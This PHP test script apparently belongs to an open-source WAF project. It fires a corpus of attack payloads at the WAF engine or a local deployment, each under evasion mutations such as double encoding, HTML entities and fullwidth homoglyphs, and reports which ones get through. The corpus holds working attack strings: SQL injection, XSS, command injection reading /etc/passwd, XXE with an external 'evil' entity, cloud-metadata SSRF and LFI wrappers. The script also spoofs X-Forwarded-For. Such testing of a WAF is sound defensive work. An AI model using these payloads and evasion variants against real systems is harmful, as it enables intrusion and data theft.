<?php
/**
 * YSL语枢-盾甲WAF
 * 作者  : 暗夜铭少
 * 邮箱  : azgq@foxmail.com
 * 网站  : https://waf.duduziy.com
 * 版权  : (c) 2026 暗夜铭少 and the YSL语枢-盾甲WAF contributors
 * 许可  : MIT -- SPDX-License-Identifier: MIT
 */

/**
 * 极限对抗测试：多类别 × 多种绕过变异 × 多种投放面
 * 目标：用真实攻击语料+逃逸变异把 WAF 往死里打，找出「应拦截却放行」的漏放。
 *
 * 两种模式：
 *   engine  —— 直接调用 YslEngine::analyze()（每次随机独立 IP，skip_ai），
 *              隔离「纯内容检测层」，避免 Chain/Window 行为态掩盖内容盲区。
 *   http    —— 对真实部署的 WAF(waflean2) 发真实 HTTP 请求，期望统一 403。
 *   both    —— 先 engine 后 http。
 *
 * 用法：
 *   php tests/adversarial.php [base_url] [mode] [mutations] [placements]
 *     mode        engine|http|both   (默认 engine)
 *     mutations   逗号列表限定变异（asis,urlenc,double,upper,lower,htmlent,hexent,tabsp,lfsp,comment,nullbt,fullwd）
 *     placements  query,form,body
 */
declare(strict_types=1);

$base   = $argv[1] ?? 'http://127.0.0.1:8088';
$mode   = $argv[2] ?? 'engine';
$mutArg = $argv[3] ?? '';
$plcArg = $argv[4] ?? '';

// ============================================================
// 全角同形字（homoglyph）：A-Z a-z -> ＦＵＬＬＷＩＤＴＨ
// ============================================================
function utf8chr(int $cp): string {
    if ($cp <= 0x7F) return chr($cp);
    if ($cp <= 0x7FF) return chr(0xC0 | ($cp >> 6)) . chr(0x80 | ($cp & 0x3F));
    return chr(0xE0 | ($cp >> 12)) . chr(0x80 | (($cp >> 6) & 0x3F)) . chr(0x80 | ($cp & 0x3F));
}
function fullwidth(string $s): string {
    $out = '';
    $n = strlen($s);
    for ($i = 0; $i < $n; $i++) {
        $o = ord($s[$i]);
        if ($o >= 0x41 && $o <= 0x5A) {           // A-Z -> Ａ-Ｚ (U+FF21..)
            $out .= utf8chr(0xFF21 + ($o - 0x41));
        } elseif ($o >= 0x61 && $o <= 0x7A) {      // a-z -> ａ-ｚ (U+FF41..)
            $out .= utf8chr(0xFF41 + ($o - 0x61));
        } else {
            $out .= $s[$i];
        }
    }
    return $out;
}

// ============================================================
// 变异器：输入是「WAF 应当看到的原文」，输出是经逃逸变换后的串。
// 投放层会再按 placement 做一次编码，保证 WAF 实际看到的正是本函数输出。
// ============================================================
$encNonAlnum = static function (string $s): string {
    return preg_replace_callback('/[^A-Za-z0-9._~-]/', static fn($m) => rawurlencode($m[0]), $s);
};
$muts = [
    'asis'    => static fn(string $s): string => $s,
    'urlenc'  => static fn(string $s): string => $encNonAlnum($s),
    'double'  => static fn(string $s): string => $encNonAlnum($encNonAlnum($s)),
    'upper'   => static fn(string $s): string => strtoupper($s),
    'lower'   => static fn(string $s): string => strtolower($s),
    'htmlent' => static fn(string $s): string =>
        str_replace(['<','>','"',"'",'(',')'], ['&lt;','&gt;','&quot;','&#39;','&#40;','&#41;'], $s),
    'hexent'  => static function (string $s): string {
        $o = ''; $n = strlen($s);
        for ($i = 0; $i < $n; $i++) { $c = $s[$i]; $o .= ctype_alnum($c) ? $c : '&#x' . dechex(ord($c)) . ';'; }
        return $o;
    },
    'tabsp'   => static fn(string $s): string => str_replace(' ', '%09', $s),
    'lfsp'    => static fn(string $s): string => str_replace(' ', '%0a', $s),
    'comment' => static fn(string $s): string => str_replace(' ', '/**/', $s),
    'nullbt'  => static fn(string $s): string => $s . '%00',
    'fullwd'  => static fn(string $s): string => fullwidth($s),
];

// ============================================================
// 基 payload：13 类，均属恶意，期望一律拦截
// 每类标注哪些投放面适用（body 用于 XXE/NoSQL/反序列化/LFI/SSTI 等常在 body 的）
// ============================================================
$bases = [
    'SQLi' => [
        ['union select',      "1' union select user,password from users-- -"],
        ['or tautology',      "1' or '1'='1"],
        ['and bool',          "1' and 1=1--"],
        ['sleep',             "1' and sleep(5)--"],
        ['extractvalue',      "1' and extractvalue(1,concat(0x7e,(select version())))--"],
        ['stacked',           "1'; drop table users--"],
        ['union all null',    "-1' union all select null,null--"],
        ['info schema',       "1' union select 1,group_concat(table_name) from information_schema.tables--"],
    ],
    'XSS' => [
        ['script',            "<script>alert(1)</script>"],
        ['img onerror',       "<img src=x onerror=alert(1)>"],
        ['svg onload',        "<svg/onload=alert(1)>"],
        ['details',           "<details open ontoggle=alert(1)>"],
        ['a href js',         "<a href=javascript:alert(1)>x</a>"],
        ['iframe srcdoc',     "<iframe srcdoc='<script>alert(1)</script>'>"],
        ['body onload',       "<body onload=alert(1)>"],
        ['breakout',          "\"><script>alert(1)</script>"],
        ['input focus',       "<input autofocus onfocus=alert(1)>"],
    ],
    'PATH' => [
        ['etc passwd',        "../../../etc/passwd"],
        ['win ini',           "..\\..\\..\\windows\\win.ini"],
        ['double slash',      "....//....//etc/passwd"],
        ['backslash mix',     "....\\/....\\/etc/passwd"],
        ['enc',               "..%2f..%2f..%2fetc%2fpasswd"],
        ['dot enc',           "%2e%2e%2fetc%2fpasswd"],
        ['double enc',        "..%252f..%252fetc/passwd"],
        ['overlong',          "..%c0%afetc%2fpasswd"],
        ['win backslash enc', "..%5c..%5cwindows%5cwin.ini"],
    ],
    'CMDi' => [
        ['semicolon',         ";cat /etc/passwd"],
        ['pipe',              "|id"],
        ['and',               "&&whoami"],
        ['dollar',            "$(id)"],
        ['backtick',          "`id`"],
        ['ifs',               "\${IFS}cat\${IFS}/etc/passwd"],
        ['ls',                ";ls -la /"],
        ['cat',               "|cat /etc/passwd"],
        ['newline',           "%0acat /etc/passwd"],
        ['or',                "||id"],
    ],
    'SSTI' => [
        ['jinja',             "{{7*7}}"],
        ['jinja config',      "{{config.items()}}"],
        ['jinja subclass',    "{{''.__class__.__mro__[1].__subclasses__()}}"],
        ['twig',              "#{7*7}"],
        ['asp',               "<%=7*7%>"],
        ['globals',           "{{request.application.__globals__}}"],
    ],
    'NoSQL' => [
        ['gt',                '{"$gt":""}'],
        ['ne',                '{"$ne":null}'],
        ['regex',             '{"$regex":".*"}'],
        ['where',             '{"$where":"sleep(1000)"}'],
        ['array ne',          'username[$ne]=x'],
    ],
    'XXE' => [
        ['file',              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
        ['win',               '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'],
        ['param',             '<!ENTITY % xxe SYSTEM "http://evil/xxe">%xxe;'],
        ['element',           '<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY s SYSTEM "file:///etc/passwd">]>'],
    ],
    'DESER' => [
        ['php obj',           'O:8:"stdClass":1:{s:3:"id";i:1;}'],
        ['arr obj',           'a:2:{s:4:"x";O:8:"stdClass":0:{}}'],
        ['base64',            'Tzo4OiJzdGRDbGFzcyI6MDp7fQ=='],
        ['destruct',          '__destruct'],
        ['unserialize',       'unserialize(base64_decode('],
    ],
    'SSRF' => [
        ['meta',              'http://169.254.169.254/latest/meta-data/'],
        ['hex',               'http://0x7f.0.0.1/'],
        ['dec',               'http://2130706433/'],
        ['ipv6',              'http://[::1]/'],
        ['localhost',         'http://localhost/'],
        ['zero',              'http://0/'],
        ['nip',               'http://127.0.0.1.nip.io/'],
    ],
    'LFI' => [
        ['php filter',        'php://filter/convert.base64-encode/resource=index.php'],
        ['data',              'data://text/plain;base64,SSBsb3ZlIFBIUA=='],
        ['expect',            'expect://id'],
        ['file',              'file:///etc/passwd'],
        ['phar',              'phar:///tmp/x.phar'],
        ['input',             'php://input'],
    ],
    'CRLF' => [
        ['setcookie',         "%0d%0aSet-Cookie:admin=1"],
        ['header',            "foo%0d%0aBar:baz"],
        ['xinject',           "%0aX-Injected:1"],
        ['body split',        "%0d%0a%0d%0a<html>injected</html>"],
    ],
    'LDAP' => [
        ['cn',                "*)(cn=*)(|(objectClass=*"],
        ['uid',               "*)(uid=*))(|(uid=*"],
        ['pass',              "*)(|(password=*"],
        ['or',                "' or 1=1 or '"],
    ],
];

// 各类适用的投放面（XXE/NoSQL/DESER/LFI/SSTI 额外加 body）
$bodyApplicable = ['XXE', 'NoSQL', 'DESER', 'LFI', 'SSTI', 'CMDi', 'SQLi'];
$bodyCt = [
    'XXE'   => 'text/xml',
    'NoSQL' => 'application/json',
    'DESER' => 'application/json',
    'LFI'   => 'application/x-www-form-urlencoded',
    'SSTI'  => 'text/plain',
    'CMDi'  => 'application/x-www-form-urlencoded',
    'SQLi'  => 'application/x-www-form-urlencoded',
];

// ============================================================
// 投放层：把 (name,value) 组装成请求；保证 WAF 实际看到的就是 $value
// ============================================================
function httpSend(string $base, string $plc, string $name, string $value, string $ct): int {
    $url = rtrim($base, '/') . '/';
    $enc = rawurlencode($value);
    $method = 'GET';
    $content = '';
    $header = "X-Stress-Client: adversarial\r\nX-Forwarded-For: " . randIP() . "\r\n";
    if ($plc === 'query') {
        $url .= '?' . rawurlencode($name) . '=' . $enc;
    } elseif ($plc === 'form') {
        $method = 'POST';
        $content = rawurlencode($name) . '=' . $enc;
        $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
    } else { // body
        $method = 'POST';
        $content = $value;
        $header .= "Content-Type: $ct\r\n";
    }
    $ctx = stream_context_create(['http' => [
        'ignore_errors' => true,
        'method'        => $method,
        'header'        => $header,
        'content'       => $content,
        'timeout'       => 15,
    ]]);
    $body = @file_get_contents($url, false, $ctx);
    if (!isset($http_response_header[0])) {
        return 0;
    }
    if (preg_match('#HTTP/\S+\s+(\d{3})#i', $http_response_header[0], $m)) {
        return (int)$m[1];
    }
    return 0;
}

function randIP(): string {
    return mt_rand(11, 223) . '.' . mt_rand(0, 255) . '.' . mt_rand(0, 255) . '.' . mt_rand(1, 254);
}

function buildReq(string $plc, string $name, string $value, string $ct): array {
    $ip = randIP();
    if ($plc === 'query') {
        return ['uri' => '/?' . rawurlencode($name) . '=' . rawurlencode($value), 'method' => 'GET',
                'params' => [$name => $value], 'ip' => $ip];
    }
    if ($plc === 'form') {
        return ['method' => 'POST', 'params' => [$name => $value], 'ip' => $ip];
    }
    return ['method' => 'POST', 'body' => $value, 'content_type' => $ct, 'ip' => $ip];
}

// ============================================================
// 选择变异 / 投放面
// ============================================================
$activeMuts = $mutArg !== '' ? array_intersect_key($muts, array_flip(explode(',', $mutArg))) : $muts;
if ($plcArg !== '') {
    $activePlc = explode(',', $plcArg);
} else {
    $activePlc = ['query', 'form']; // 默认双投放，body 在循环里按需追加
}

$engineReady = false;
if ($mode === 'engine' || $mode === 'both') {
    define('ABSPATH', __DIR__);
    require_once __DIR__ . '/../core/YslEngine.php';
    $engineReady = class_exists('YslEngine');
}

// ============================================================
// 主循环
// ============================================================
$total = 0; $blocked = 0; $leak = 0;
$leaks = [];           // [cat, label, mut, plc, seen]
$byCat = [];           // cat => [total, leak]

foreach ($bases as $cat => $items) {
    $byCat[$cat] = [0, 0];
    $plcs = $activePlc;
    if (in_array('body', $activePlc, true) === false && in_array($cat, $bodyApplicable, true)) {
        $plcs[] = 'body';
    }
    foreach ($items as [$label, $payload]) {
        foreach ($activeMuts as $mname => $mfn) {
            $value = $mfn($payload);
            if ($value === '') { continue; }
            foreach ($plcs as $plc) {
                if ($plc === 'body' && !in_array($cat, $bodyApplicable, true)) { continue; }
                $ct = $bodyCt[$cat] ?? 'application/x-www-form-urlencoded';
                $total++; $byCat[$cat][0]++;

                $blockedFlag = false;
                if ($mode === 'engine' || $mode === 'both') {
                    $r = YslEngine::analyze(buildReq($plc, 'p', $value, $ct), ['skip_ai' => true]);
                    $action = (string)($r['action'] ?? '?');
                    $reason = (string)($r['reason'] ?? '');
                    $blockedFlag = in_array($action, ['block', 'challenge', 'deny', 'reject'], true);
                } else { // http
                    $code = httpSend($base, $plc, 'p', $value, $ct);
                    $blockedFlag = ($code === 403);
                    $action = "HTTP $code";
                    $reason = '';
                }

                if ($blockedFlag) {
                    $blocked++;
                } else {
                    $leak++; $byCat[$cat][1]++;
                    $leaks[] = [$cat, $label, $mname, $plc, $value, $action, $reason];
                }
            }
        }
    }
}

// ============================================================
// 报告
// ============================================================
echo "===== 极限对抗回放 (mode=$mode) =====\n";
echo "总数 $total | 拦截 $blocked | 漏放 $leak | 漏放率 " .
     ($total > 0 ? round(100 * $leak / $total, 2) : 0) . "%\n\n";

echo "--- 各类别 ---\n";
foreach ($byCat as $cat => [$t, $l]) {
    $rate = $t > 0 ? round(100 * $l / $t, 1) : 0;
    echo sprintf("  %-7s  %3d/%-3d  漏放 %d (%.1f%%)\n", $cat, $t - $l, $t, $l, $rate);
}

if ($leaks !== []) {
    // 完整明细同时导出到 TSV，便于逐类定位检测盲区（不截断 payload）
    $tsv = @fopen(__DIR__ . '/adv_leaks.tsv', 'w');
    if ($tsv) {
        fwrite($tsv, "cat\tlabel\tmut\tplc\taction\treason\tvalue\n");
        foreach ($leaks as [$cat, $label, $mname, $plc, $value, $action, $reason]) {
            $flat = str_replace(["\t", "\r", "\n", "\0"], ['\\t', '\\r', '\\n', '\\0'], $value);
            fwrite($tsv, "$cat\t$label\t$mname\t$plc\t$action\t$reason\t$flat\n");
        }
        fclose($tsv);
    }
    echo "\n--- 漏放明细 (前 60，完整清单见 tests/adv_leaks.tsv) ---\n";
    $n = 0;
    foreach ($leaks as [$cat, $label, $mname, $plc, $value, $action, $reason]) {
        if ($n++ >= 60) { echo "  ... 其余 " . (count($leaks) - 60) . " 条省略\n"; break; }
        $v = strlen($value) > 70 ? substr($value, 0, 67) . '...' : $value;
        echo sprintf("  [%s] %s | mut=%s | %s | act=%s | %s\n", $cat, $label, $mname, $plc, $action, $v);
    }
} else {
    @unlink(__DIR__ . '/adv_leaks.tsv');
    echo "\n✅ 无漏放：所有变异 × 投放面均被拦截。\n";
}
